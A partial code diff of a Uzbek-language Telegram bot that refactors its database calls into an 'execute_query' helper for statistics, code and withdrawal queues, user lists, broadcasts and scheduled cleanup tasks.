+        blocked_users = execute_query("SELECT COUNT(*) FROM users WHERE is_blocked = TRUE", fetch_one=True)[0]
+        pending = execute_query("SELECT COUNT(*) FROM codes WHERE status = 'pending' OR status = 'pending_verify'", fetch_one=True)[0]
+        verified = execute_query("SELECT COUNT(*) FROM codes WHERE status = 'verified'", fetch_one=True)[0]
+        rejected = execute_query("SELECT COUNT(*) FROM codes WHERE status = 'rejected'", fetch_one=True)[0]
+        verified_phones = execute_query("SELECT COUNT(*) FROM verified_phones", fetch_one=True)[0]
+        total_balance = execute_query("SELECT COALESCE(SUM(balance), 0) FROM users", fetch_one=True)[0]
+        pending_withdraws = execute_query("SELECT COUNT(*) FROM withdraws WHERE status = 'pending'", fetch_one=True)[0]
+        completed_withdraws = execute_query("SELECT COUNT(*) FROM withdraws WHERE status = 'completed'", fetch_one=True)[0]
+        total_withdrawn = execute_query("SELECT COALESCE(SUM(amount), 0) FROM withdraws WHERE status = 'completed'", fetch_one=True)[0]
+        total_referrals = execute_query("SELECT COUNT(*) FROM referrals", fetch_one=True)[0]
+        today_users = execute_query("SELECT COUNT(*) FROM users WHERE created_at::date = CURRENT_DATE", fetch_one=True)[0]
+        today_verified = execute_query("SELECT COUNT(*) FROM codes WHERE created_at::date = CURRENT_DATE AND status = 'verified'", fetch_one=True)[0]
         
         await message.answer(
             f"📊 <b>STATISTIKA</b>\n\n"
@@ -1308,11 +1297,10 @@ async def pending_codes(message: types.Message):
         return
     
     try:
-        with db_cursor() as cursor:
-            cursor.execute(
-                "SELECT * FROM codes WHERE status = 'pending_verify' AND expires_at > NOW() ORDER BY id DESC LIMIT 20"
-            )
-            codes = cursor.fetchall()
+        codes = execute_query(
+            "SELECT * FROM codes WHERE status = 'pending_verify' AND expires_at > NOW() ORDER BY id DESC LIMIT 20",
+            fetch_all=True
+        )
         
         if codes:
             text = "📋 <b>KUTAYOTGAN KODLAR:</b>\n\n"
@@ -1337,11 +1325,10 @@ async def pending_withdraws(message: types.Message):
         return
     
     try:
-        with db_cursor() as cursor:
-            cursor.execute(
-                "SELECT * FROM withdraws WHERE status = 'pending' ORDER BY id DESC LIMIT 20"
-            )
-            withdraws = cursor.fetchall()
+        withdraws = execute_query(
+            "SELECT * FROM withdraws WHERE status = 'pending' ORDER BY id DESC LIMIT 20",
+            fetch_all=True
+        )
         
         if withdraws:
             text = "💸 <b>YECHISH SO'ROVLARI:</b>\n\n"
@@ -1365,9 +1352,10 @@ async def verified_phones_list(message: types.Message):
         return
     
     try:
-        with db_cursor() as cursor:
-            cursor.execute("SELECT * FROM verified_phones ORDER BY id DESC LIMIT 50")
-            phones = cursor.fetchall()
+        phones = execute_query(
+            "SELECT * FROM verified_phones ORDER BY id DESC LIMIT 50",
+            fetch_all=True
+        )
         
         if phones:
             text = "✅ <b>TASDIQLANGAN RAQAMLAR:</b>\n\n"
@@ -1407,14 +1395,14 @@ async def broadcast_send(message: types.Message):
     admin_states.pop(Config.ADMIN_ID, None)
     
     try:
-        with db_cursor() as cursor:
-            cursor.execute("SELECT telegram_id FROM users WHERE is_blocked = FALSE")
-            users = cursor.fetchall()
+        users = execute_query(
+            "SELECT telegram_id FROM users WHERE is_blocked = FALSE",
+            fetch_all=True
+        )
         
         sent = 0
         failed = 0
         
-        # Yuborish jarayonini ko'rsatish
         status_msg = await message.answer(f"📨 Yuborilmoqda... 0/{len(users)}")
         
         for i, user in enumerate(users, 1):
@@ -1425,14 +1413,13 @@ async def broadcast_send(message: types.Message):
                 failed += 1
                 logger.error(f"❌ Xabar yuborishda xatolik ({user[0]}): {e}")
             
-            # Har 10 ta foydalanuvchida statusni yangilash
             if i % 10 == 0:
                 try:
                     await status_msg.edit_text(f"📨 Yuborilmoqda... {i}/{len(users)}")
                 except:
                     pass
             
-            await asyncio.sleep(0.05)  # Rate limiting
+            await asyncio.sleep(0.05)
         
         await status_msg.edit_text(
             f"✅ Yuborildi: {sent} ta\n"
@@ -1451,11 +1438,10 @@ async def users_list(message: types.Message):
         return
     
     try:
-        with db_cursor() as cursor:
-            cursor.execute(
-                "SELECT telegram_id, phone, balance, is_blocked, created_at FROM users ORDER BY id DESC LIMIT 30"
-            )
-            users = cursor.fetchall()
+        users = execute_query(
+            "SELECT telegram_id, phone, balance, is_blocked, created_at FROM users ORDER BY id DESC LIMIT 30",
+            fetch_all=True
+        )
         
         if users:
             text = "👥 <b>FOYDALANUVCHILAR:</b>\n\n"
@@ -1552,12 +1538,11 @@ async def show_history(message: types.Message):
         return
     
     try:
-        with db_cursor() as cursor:
-            cursor.execute(
-                "SELECT * FROM transactions WHERE telegram_id = %s ORDER BY id DESC LIMIT 10",
-                (telegram_id,)
-            )
-            transactions = cursor.fetchall()
+        transactions = execute_query(
+            "SELECT * FROM transactions WHERE telegram_id = %s ORDER BY id DESC LIMIT 10",
+            (telegram_id,),
+            fetch_all=True
+        )
         
         if transactions:
             text = "📜 <b>TRANZAKSIYALAR TARIXI:</b>\n\n"
@@ -1580,57 +1565,47 @@ async def cleanup_expired_codes():
     """Eskirgan kodlarni tozalash"""
     while True:
         try:
-            with db_cursor() as cursor:
-                cursor.execute(
-                    "UPDATE codes SET status = 'expired' WHERE status IN ('pending', 'pending_verify') AND expires_at < NOW()"
-                )
+            execute_query(
+                "UPDATE codes SET status = 'expired' WHERE status IN ('pending', 'pending_verify') AND expires_at < NOW()"
+            )
             logger.info("✅ Eskirgan kodlar tozalandi")
         except Exception as e:
             logger.error(f"❌ Tozalash xatosi: {e}")
-        await asyncio.sleep(60)  # Har daqiqada
+        await asyncio.sleep(60)
 
 async def check_expired_withdraws():
     """Eskirgan yechish so'rovlarini tekshirish"""
     while True:
         try:
-            with db_cursor() as cursor:
-                # 24 soatdan ortiq kutayotgan so'rovlarni topish
-                cursor.execute(
-                    """
-                    SELECT * FROM withdraws 
-                    WHERE status = 'pending' 
-                    AND created_at < NOW() - INTERVAL '24 hours'
-                    """
+            expired_withdraws = execute_query(
+                "SELECT * FROM withdraws WHERE status = 'pending' AND created_at < NOW() - INTERVAL '24 hours'",
+                fetch_all=True
+            )
+            
+            for withdraw in expired_withdraws:
+                execute_query(
+                    "UPDATE withdraws SET status = 'rejected', processed_at = CURRENT_TIMESTAMP WHERE id = %s",
+                    (withdraw[0],)
                 )
-                expired_withdraws = cursor.fetchall()
                 
-                for withdraw in expired_withdraws:
-                    # So'rovni rad etish
-                    cursor.execute(
-                        "UPDATE withdraws SET status = 'rejected', processed_at = CURRENT_TIMESTAMP WHERE id = %s",
-                        (withdraw[0],)
+                execute_query(
+                    "UPDATE users SET balance = balance + %s WHERE telegram_id = %s",
+                    (withdraw[3], withdraw[1])
+                )
+                
+                try:
+                    await bot.send_message(
+                        withdraw[1],
+                        f"❌ Yechish so'rovingiz avtomatik rad etildi!\n"
+                        f"💰 {withdraw[3]:,} so'm balansga qaytarildi.\n"
+                        f"📝 Sabab: 24 soat ichida admin tomonidan tasdiqlanmadi.",
+                        reply_markup=get_user_menu()
                     )
-                    
-                    # Balansni qaytarish
-                    cursor.execute(
-                        "UPDATE users SET balance = balance + %s WHERE telegram_id = %s",
-                        (withdraw[3], withdraw[1])
-                    )
-                    
-                    # Foydalanuvchiga xabar
-                    try:
-                        await bot.send_message(
-                            withdraw[1],
-                            f"❌ Yechish so'rovingiz avtomatik rad etildi!\n"
-                            f"💰 {withdraw[3]:,} so'm balansga qaytarildi.\n"
-                            f"📝 Sabab: 24 soat ichida admin tomonidan tasdiqlanmadi.",
-                            reply_markup=get_user_menu()
-                        )
-                    except:
-                        pass
+                except:
+                    pass
         except Exception as e:
             logger.error(f"❌ Yechish tekshirish xatosi: {e}")
-        await asyncio.sleep(300)  # Har 5 daqiqada
+        await asyncio.sleep(300)
 
 # ================= MAIN =================
 async def main():
@@ -1643,7 +1618,6 @@ async def main():
         logger.error(f"❌ Database init xatosi: {e}")
         return
     
-    # Tozalash vazifalarini boshlash
     asyncio.create_task(cleanup_expired_codes())
     asyncio.create_task(check_expired_withdraws())
     
